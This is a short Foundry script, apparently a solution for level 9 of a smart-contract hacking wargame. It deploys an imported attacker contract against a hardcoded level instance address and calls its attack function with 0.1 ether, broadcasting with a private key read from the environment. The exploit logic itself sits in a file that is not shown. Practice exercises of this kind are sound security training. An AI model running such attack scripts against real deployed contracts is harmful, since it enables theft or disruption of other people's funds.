// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level09-Attacker.sol";

contract AttackerScript is Script {
    Level09Attacker attacker;

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      // Deploy using script this time, Wouhou! you need yo put your instance level here
      attacker = new Level09Attacker(payable(0xC46598CDAE5C0e137581420B31fd2f9A46F15982));
      (bool attackSuccess) = attacker.attack{value: 0.1 ether}();
      console.log("Attack Successful", attackSuccess);
      vm.stopBroadcast();
    }
}
